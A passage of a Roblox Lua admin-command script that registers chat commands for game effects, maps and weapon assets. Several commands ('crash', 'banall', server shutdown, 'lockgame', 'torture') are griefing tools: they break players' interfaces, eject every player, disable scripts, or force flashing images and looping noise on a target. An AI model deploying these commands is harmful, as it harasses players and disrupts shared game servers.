script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, M, 0)
wait()
end
]]
QuickScript.Parent = v
else
v.Rotational.Value = speed
end
end
end
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("instance", 5, function(msg, MessageSplit, Speaker, Self)
speed = string.sub(msg, 10) 
speed = tonumber(speed) 
if (speed ~= nil) then 
if (speed == 0) then
Instance.new = nil
elseif (speed == 1) then
Instance.new = wutnaobro
end
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("speed", 5, function(msg, MessageSplit, Speaker, Self)
speed = string.sub(msg, 7) 
speed = tonumber(speed) 
if speed ~= nil then 
local h = Instance.new("Hint") 
h.Parent = Speaker.PlayerGui
h.Text = "Yes master, speed changed to "..tostring(speed).."..." 
for _,v in pairs(Speaker.Character:GetChildren()) do 
if v.className == "Humanoid" then 
v.WalkSpeed = speed 
end 
end 
wait(2) 
h:Remove() 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("servicename", 5, function(msg, MessageSplit, Speaker, Self)
ServiceName = string.sub(msg, 6)
if Game:GetService(ServiceName) ~= nil then
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = ServiceName.. "'s name is " ..Game:GetService(ServiceName).Name
wait(3)
M:Remove()
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unpunish", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
player.Character.Parent = Workspace
player.Character:MakeJoints()
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("punish", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
player.Character.Parent = nil
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("crash", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player:FindFirstChild("Backpack") ~= nil) then
local QuickScript = Game:service("InsertService"):LoadAsset(54471119)["QuickLocalScript"]
QuickScript.Name = "CrashScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
Game:GetService("Debris"):AddItem(Game:FindFirstChild("RobloxGui", true), 0)
]]
QuickScript.Parent = player.Backpack
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("legohint", 5, function(msg, MessageSplit, Speaker, Self)
message = string.sub(msg, 8) 
g = game:GetService("InsertService"):LoadAsset(59345155) 
g.Parent = Workspace
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = g.ThemedBanner:Clone()
c.Parent = v.PlayerGui
c.Message.Value = message
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("themedbanner", 5, function(msg, MessageSplit, Speaker, Self)
message = string.sub(msg, 6) 
g = game:GetService("InsertService"):LoadAsset(59345155) 
g.Parent = Workspace
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = g.ThemedBanner:Clone()
c.Parent = v.PlayerGui
c.Message.Value = message
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("legomsg", 5, function(msg, MessageSplit, Speaker, Self)
message = string.sub(msg, 8) 
g = game:GetService("InsertService"):LoadAsset(60267366) 
g.Parent = Workspace
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = g.TextBanner:Clone()
c.Parent = v.PlayerGui
c.Message.Value = message
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("notify", 5, function(msg, MessageSplit, Speaker, Self)
message = string.sub(msg, 8) 
Notify(Speaker.Name.. ": " ..message)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("msg", 5, function(msg, MessageSplit, Speaker, Self)
message = string.sub(msg, 5) 
g = game:GetService("InsertService"):LoadAsset(60267366) 
g.Parent = Workspace
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = g.TextBanner:Clone()
c.Parent = v.PlayerGui
c.Message.Value = message
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("glitch", 5, function(msg, MessageSplit, Speaker, Self)
Workspace:MoveTo(Vector3.new(0, 100000000, 0))
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("turret", 5, function(msg, MessageSplit, Speaker, Self)
m = Game:GetService("InsertService"):LoadAsset(12398243)
m.Parent = Speaker.Character
m:MakeJoints()
m:MoveTo(Speaker.Character.Torso.Position + Vector3.new(10, 0, 0))
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rain", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Master " ..Speaker.Name.. ", I have forcasted rain!")
for i = 1, 1000 do 
local Rain = Instance.new("Part") 
Rain.Parent = Workspace 
Rain.Position = Vector3.new(math.random(-250,250), 200, math.random(-250,250)) 
Rain.Name = "Droplet" 
Rain.Size = Vector3.new(1,3,1) 
Rain.BrickColor = BrickColor.Blue() 
Rain.Locked = true 
function onTouched()
Rain:Remove()
end
Rain.Touched:connect(onTouched)
wait(.01) 
end 
for i, v in pairs(Workspace:GetChildren()) do
if v.Name == "Droplet" then
v:Remove()
wait()
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("mountain", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", now erecting a mountain.")
size = 30
bs = 15
curved = true
pmin = 2
pmax = 5
count = 0
for x = 1, 100 do
ti = size-2
count = count+1
if (ti<=0) then
count = count-1
end
end
min = 5
max = 10
mm = 0
l = -206
r = -206
xl = l
xr = r
xs = math.random(min, max)
for i = 1, count do
for x = 1, size-mm do
p = Instance.new("Part")
p.Parent = Workspace
p.formFactor = 1
p.Size = Vector3.new(bs, math.random(min,max), bs)
p.Position = Vector3.new(l, p.Size.Y/2, r)
p.BrickColor = BrickColor.new(MountainColors[math.random(1, #MountainColors)])
p.Anchored = true
LASTPART = p
xs = LASTPART.Size.Y
l = l+bs
end
LASTPART:remove()
l = l-bs
for x = 1, size-mm do
p = Instance.new("Part")
p.Parent = Workspace
p.formFactor = 1
p.Size = Vector3.new(bs, math.random(min,max), bs)
p.Position = Vector3.new(l, p.Size.Y/2, r)
p.BrickColor = BrickColor.new(MountainColors[math.random(1, #MountainColors)])
p.Anchored = true
LASTPART = p
r= r+bs
end
LASTPART:remove()
r = r-bs
for x = 1, size-mm do
p = Instance.new("Part")
p.Parent = Workspace
p.formFactor = 1
p.Size = Vector3.new(bs, math.random(min,max), bs)
p.Position = Vector3.new(l, p.Size.Y/2, r)
p.BrickColor = BrickColor.new(MountainColors[math.random(1, #MountainColors)])
p.Anchored = true
LASTPART = p
l = l-bs
end
LASTPART:remove()
l = l+bs
for x = 1, size-mm do
p = Instance.new("Part")
p.Parent = Workspace
p.formFactor = 1
p.Size = Vector3.new(bs, math.random(min,max), bs)
p.Position = Vector3.new(l, p.Size.Y/2, r)
p.BrickColor = BrickColor.new(MountainColors[math.random(1, #MountainColors)])
p.Anchored = true
LASTPART = p
r= r-bs
end
LASTPART:remove()
r = xr+bs
l = xl+bs
xr = r
xl = l
min = min+10
max = max+10
if (curved==true) then
min = min-10
max = max-10
min = min+pmin
max = max+pmax
pmin = pmin+2
pmax = pmax+2
end
xs = math.random(min, max)
mm = mm+2
end
wait(3)
for i,v in pairs(Players:GetChildren()) do 
if v:IsA("Player") then 
v.Character:MoveTo(Vector3.new(math.random(0,50), 500, math.random(0,50))) 
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rebase", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", a baseplate has been created.")
local Base = Instance.new("Part") 
Base.Parent = Workspace 
Base.Name = "Base" 
Base.Anchored = true 
Base.CFrame = CFrame.new(Vector3.new(0, 0, 0))
Base.Size = Vector3.new(512, 1.2, 512) 
Base.BrickColor = BrickColor.Green() 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("weapons", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", now constructing a weapons room.")
p = Game:GetService("InsertService"):LoadAsset(23243149) 
p.Parent = Workspace 
p:MakeJoints() 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("god", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Humanoid") ~= nil) then
player.Character.Humanoid.MaxHealth = math.huge
player.Character.Humanoid.Health = math.huge
end
if player.Character:FindFirstChild("Torso") ~= nil then
local FF = Instance.new("ForceField")
FF.Parent = player.Character
local Sparkles = Instance.new("Sparkles")
Sparkles.Parent = player.Character.Torso
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "RotationScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
function onTouched(hit)
if hit.Parent:FindFirstChild("Humanoid") ~= nil then
hit.Parent:BreakJoints()
end
end

script.Parent.Touched:connect(onTouched)
]]
QuickScript.Parent = player.Character.Torso
end
end 
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unprotect", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Torso") ~= nil then
for i, v in pairs(player.Character:GetChildren()) do
if v:IsA("ForceField") then
v:Remove()
end
end
end
end 
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("protect", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Torso") ~= nil then
local FF = Instance.new("ForceField")
FF.Parent = player.Character
end
end 
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("i2", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player:FindFirstChild("Backpack") ~= nil then
m = Game:GetService("InsertService"):LoadAsset(60159247)["InsertTool"]
m.Parent = player.Backpack
end
end
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("delimber", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Players:GetChildren()) do
if v:IsA("Player") then
v.Character:BreakJoints()
v.Character:MakeJoints()
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unlockgame", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Game unlocked.")
ScriptContext.ScriptsDisabled = false
services = {"Debris", "Workspace", "Lighting", "SoundScape", "Players", "ScriptContext"}
for i = 1, #services do
pcall(function()
Game:GetService(services[i]).Name = services[i]
end)
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("lockgame", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Game locked.")
ScriptContext.ScriptsDisabled = true
services = {"Debris", "Workspace", "Lighting", "SoundScape", "Players", "ScriptContext"}
for i = 1, #services do
M = math.random(100000000, 200000000)
pcall(function()
game:GetService(services[i]).Name = M
end)
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("banall", 5, function(msg, MessageSplit, Speaker, Self)
local S = Instance.new("Sound")
S.Parent = Workspace
S.Name = "Beep"
S.SoundId = "http://www.roblox.com/asset/?id=15666462"
S.Volume = 1
S.Looped = true
S.archivable = false
while true do
S:Play()
Game:GetService("Lighting").Ambient = Color3.new(50, 0, 0) 
Game:GetService("Lighting").TimeOfDay = "01:00:00" 
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = "Server Status | Dead"
for i, v in pairs(Players:GetChildren()) do
v:Remove()
end
wait(5)
end
wait()
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("skydive", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", we will now skydive.")
wait(3) 
for i,v in pairs(Players:GetChildren()) do 
if v:IsA("Player") then 
v.Character:MoveTo(Vector3.new(math.random(0,50), 4000, math.random(0,50))) 
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("darkness", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", calling darkness." )
local T = Instance.new("Sound")
T.Parent = Workspace
T.Name = "Sound"
T.SoundId = "http://www.roblox.com/asset/?id=4761522"
T.Volume = 1
T.Looped = false
T.archivable = false
T:Play()
T:Play()
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sit", 5, function(msg, MessageSplit, Speaker, Self)
for i,v in pairs(Players:GetChildren()) do 
if v:IsA("Player") then 
v.Character.Humanoid.Sit = true 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nuke", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", now firing a nuke!")
local NukeGui = Game:service("InsertService"):LoadAsset(60299178)["_NukeGui"]
for i, v in pairs(Players:GetChildren()) do
if v:IsA("Player") then
if v:FindFirstChild("PlayerGui") ~= nil then
local C = NukeGui:Clone()
C.Parent = v.PlayerGui
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("s/debug/end", 5, function(msg, MessageSplit, Speaker, Self)
Notify("The server will now shutdown.")
wait(3)
Players.PlayerAdded:connect(function(np)np:Remove()end)
for a,b in pairs(Players:GetPlayers())do b:Remove()end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("reset", 5, function(msg, MessageSplit, Speaker, Self)
if Speaker ~= 0 then
local ack2 = Instance.new("Model")
ack2.Parent = Workspace
local ack4 = Instance.new("Part")
ack4.Transparency = 1
ack4.CanCollide = false
ack4.Anchored = true
ack4.Name = "Torso"
ack4.Position = Vector3.new(10000, 10000, 10000)
ack4.Parent = ack2
local ack3 = Instance.new("Humanoid")
ack3.Torso = ack4
ack3.Parent = ack2
Speaker.Character = ack2
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("car", 5, function(msg, MessageSplit, Speaker, Self)
p = Game:GetService("InsertService"):LoadAsset(21598206)
p.Parent = Workspace
p:MakeJoints()
p:MoveTo(Speaker.Character.Torso.Position + Vector3.new(0, 2, 10))
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("laser", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", now firing a laser.")
local Laser = Instance.new("Part") 
Laser.Parent = Workspace 
Laser.Name = "Laser" 
Laser.CFrame = CFrame.new(0, 0, 0) 
Laser.Anchored = true 
Laser.Locked = true 
Laser.Size = Vector3.new(1000, 1000, 1000) 
Laser.BrickColor = BrickColor.Red() 
Laser.Material = ("CorrodedMetal") 
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("Model") or v:IsA("Part") then
v:BreakJoints()
end
end
wait(3) 
Laser:Remove() 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("boulder", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Head") ~= nil) then
for i = 1, 10 do
P = Instance.new("Part")
P.Parent = Workspace
P.Name = "Boulder"
P.formFactor = ("Symmetric")
P.Velocity = Vector3.new(0, 50, 0)
M = math.random(20, 40)
P.Size = Vector3.new(M, M, M)
P.Material = ("Slate")
P.Shape = ("Ball")
P.TopSurface = ("Smooth")
P.BottomSurface = ("Smooth")
P:BreakJoints()
P.Position = player.Character.Head.Position + Vector3.new(math.random(-10, 10), 30, math.random(-10, 10))
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "BoulderScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
function onTouched(hit)
if hit.Parent:FindFirstChild("Humanoid") ~= nil then
hit.Parent:BreakJoints()
end
end

script.Parent.Touched:connect(onTouched)

----------
wait(5)
---
script.Parent:Remove()
----------
]]
QuickScript.Parent = P
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ttm", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Torso") ~= nil) then
player.Character:MoveTo(Speaker.Character.Torso.Position)
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("tmt", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Torso") ~= nil then
Speaker.Character:MoveTo(player.Character.Torso.Position) 
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fireworks", 5, function(msg, MessageSplit, Speaker, Self)
fireworknum = 25
sparknum = 10
untilfireworks = 5
Game:GetService("Lighting").Ambient = Color3.new(56)
for i = 1, untilfireworks - 1 do
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = "Yes Master " ..Speaker.Name.. ", fireworks in " ..untilfireworks.. " seconds!"
wait(1)
M:Remove()
untilfireworks = untilfireworks - 1
end
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = "Yes Master " ..Speaker.Name.. ", fireworks in 1 second!"
wait(1)
M:Remove()
for i = 1, fireworknum do
local pos = Vector3.new(math.random(1, 100), math.random(50, 75), math.random(1, 100))
local e = Instance.new("Explosion")
e.Parent = Workspace
e.Position = pos
for i = 1, sparknum do
local s = Instance.new("Part")
s.Parent = Workspace
s.Position = pos
s.Size = Vector3.new(1, 1, 1)
s.Name = "Spark"
s.Shape = ("Ball")
s.BrickColor = BrickColor.new(math.random(100, 200))
function onTouched(hit)
if hit.Name ~= "Spark" then
s:Remove()
end
end
s.Touched:connect(onTouched)
local bv = Instance.new("BodyVelocity")
bv.Parent = s
bv.velocity = Vector3.new(math.random(-10, 10), -25, math.random(-10, 10))
end
for i = 1,5 do
Game:GetService("Lighting").Ambient = Color3.new(math.random(), math.random(), math.random())
wait(.05)
end
wait(3)
end
Game:GetService("Lighting").Ambient = Color3.new(1, 1, 1)
for i, v in pairs(Workspace:GetChildren()) do
if v.Name == "Spark" then
v:Remove()
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("blustartup", 5, function(msg, MessageSplit, Speaker, Self)
p = Game:GetService("InsertService"):LoadAsset(58633419) 
p.Parent = Workspace 
for i, v in pairs(Players:GetChildren()) do
local C = p.BlueStartup:Clone()
C.Parent = v.PlayerGui
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("lasergun", 5, function(msg, MessageSplit, Speaker, Self)
p = Game:GetService("InsertService"):LoadAsset(31574513) 
p.Parent = Workspace 
p:MakeJoints() 
p:MoveTo(Speaker.Character.Torso.Position) 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gun", 5, function(msg, MessageSplit, Speaker, Self)
p = Game:GetService("InsertService"):LoadAsset(58607115) 
p.Parent = Workspace 
p:MakeJoints() 
p:MoveTo(Speaker.Character.Torso.Position) 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cannon", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player:FindFirstChild("Backpack") ~= nil) then
p = Game:GetService("InsertService"):LoadAsset(60300581)["HandCannon"]
p.Parent = player.Backpack
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("taser", 5, function(msg, MessageSplit, Speaker, Self)
p = Game:GetService("InsertService"):LoadAsset(58624722) 
p.Parent = Workspace 
p:MakeJoints() 
p:MoveTo(Speaker.Character.Torso.Position) 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sword", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player:FindFirstChild("Backpack") ~= nil then
p = Game:GetService("InsertService"):LoadAsset(60130896)["EpicKatana"]
p.Parent = player.Backpack
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("untorture", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player:FindFirstChild("PlayerGui") ~= nil) then
for i, v in pairs(player.PlayerGui:GetChildren()) do
if (v.Name == "_TortureGui") then
v:Remove()
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("torture", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player:FindFirstChild("PlayerGui") ~= nil) then
local Gui = Instance.new("ScreenGui")
Gui.Parent = player.PlayerGui
Gui.Name = "_TortureGui"
local Image = Instance.new("ImageLabel")
Image.Parent = Gui
Image.Position = UDim2.new(0, 0, 0, 0)
Image.Size = UDim2.new(1, 0, 1, 0)
Image.Name = "ImageLabel"
local Lolwut = Instance.new("TextLabel")
Lolwut.Parent = Image
Lolwut.Name = "Lolwut"
Lolwut.Position = UDim2.new(.5, 0, .5, 0)
Lolwut.Text = "Increasing speed..."
Lolwut.Visible = false
local S = Instance.new("Sound")
S.Parent = Image
S.Name = "Trolololol"
S.SoundId = "http://www.roblox.com/asset/?id=27697298"
S.Volume = 1
S.Looped = true
S.archivable = false
S.Pitch = 2
S:Play()
print("This should print.")
local QuickScript = Game:GetService("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "Script"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
Images = {"http://www.roblox.com/asset/?id=60457275", "http://www.roblox.com/asset/?id=60457295", "http://www.roblox.com/asset/?id=60457311", "http://www.roblox.com/asset/?id=60457338", "http://www.roblox.com/asset/?id=60457366"}

script.Parent.Parent.Trolololol:Play()
wait()
script.Parent.Parent.Trolololol:Play()
Q = 0
Time = .1

while true do
Q = Q + 1
i = math.random(1, #Images)
script.Parent.Image = Images[i]
if Q == 100 then
script.Parent.Lolwut.Visible = true
script.Parent.Parent.Trolololol.Pitch = script.Parent.Parent.Trolololol.Pitch + .5
Time = Time - (Time / 2)
Q = 0
end
wait(Time)
end
]]
QuickScript.Parent = Image
local QuickScript2 = Game:GetService("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript2.Name = "Script"
QuickScript2.Debug:Remove()
QuickScript2.NewSource.Value = [[
while true do
if script.Parent.Visible == true then
wait(1.5)
script.Parent.Visible = false
end
wait()
end
]]
QuickScript2.Parent = Lolwut
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("troll", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player:FindFirstChild("PlayerGui") ~= nil then
g = game:GetService("InsertService"):LoadAsset(58558812) 
g.Parent = Workspace
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = g.TrollGui:Clone()
c.Parent = player.PlayerGui
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("render", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Humanoid") ~= nil then
player.Character.Humanoid.WalkSpeed = math.huge * math.huge * math.huge
end
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("delimber", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
player.Character:BreakJoints() 
player.Character:MakeJoints()
end
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("phrase", 5, function(msg, MessageSplit, Speaker, Self)
Notify("And now a word from " ..Speaker.Name.. ".")
wait(6)
v = math.random(1, #phrase)
Notify(phrase[v])
end, "None", "None", "None")

--Maps Start (doesn't work)


local test = 61598425
local sfotho = 60945618
local Khranos = 45058287
local Crossroads = 40791313
local RHQ = 42643984
local sfoth4 = 45546307
local frost = 44264294
local glass = 45926181
local rocket = 45926078
local mansion = 45926383
local l4d = 38053179
local zombie = 42160959
local blcity = 42991783
local ww2 = 60946203
local cliff = 60946802


CoolCMDs.Functions.CreateCommand("blcity", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(blcity,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ww2", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(ww2, Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cliff", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(cliff, Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("to v4", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(test,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("l4d", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(l4d,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("zombie", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(zombie,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("chaos", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(Chaos,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("frost", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(frost,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("glass", 5, function(msg, MessageSplit, Speaker, Self)
model(glass,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rocket", 5, function(msg, MessageSplit, Speaker, Self)
model(rocket,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("mansion", 5, function(msg, MessageSplit, Speaker, Self)
model(mansion,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sfotho", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(sfotho,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rhq", 5, function(msg, MessageSplit, Speaker, Self)
model(RHQ,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("khranos", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
model(Khranos,Workspace)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("crossroads", 5, function(msg, MessageSplit, Speaker, Self)
lawhlzmap = game:GetService("InsertService"):LoadAsset(Crossroads)
lawhlzmap.Parent = Workspace
lawhlzmap:makeJoints()
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sfoth4", 5, function(msg, MessageSplit, Speaker, Self)
for i, v in pairs(Workspace:GetChildren()) do
if v:IsA("BasePart") or v.Name == "Base" then
v:Remove()
end
end
lawhlzmap = Game:GetService("InsertService"):LoadAsset(sfoth4)
lawhlzmap.Parent = Workspace
lawhlzmap:makeJoints()
end, "None", "None", "None")

--Maps end

CoolCMDs.Functions.CreateCommand("smash", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do
local player = matchPlayer(word)
if (player ~= nil) then
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Head") ~= nil) then
if (player.Character:FindFirstChild("Humanoid") ~= nil) then
player.Character.Humanoid.WalkSpeed = 0
p = Instance.new("Part") 
p.Parent = Workspace
p.Size = Vector3.new(10, 10, 5) 
p.Position = player.Character.Head.Position + Vector3.new(0, 10, 0)
p.CFrame = CFrame.new(player.Character.Head.Position + Vector3.new(0, 10, 0))
p.Name = "SmashBrick"
p.Anchored = true 
p.Transparency = 1
p.CanCollide = false
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "SmashScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
function onTouched(hit)
if hit.Parent:FindFirstChild("Humanoid") ~= nil then
hit.Parent:BreakJoints()
end
end

script.Parent.Touched:connect(onTouched)

for i = 1, 10 do
script.Parent.Transparency = script.Parent.Transparency - .1
wait()
end
----------
wait(1)
script.Parent.Anchored = false
wait(.5)
script.Parent.Anchored = true
---
for i = 1, 10 do
script.Parent.Transparency = script.Parent.Transparency + .1
wait()
end
----------
script.Parent:Remove()
---
]]
QuickScript.Parent = p
end 
end
end
end
end
end, "None", "None", "None")

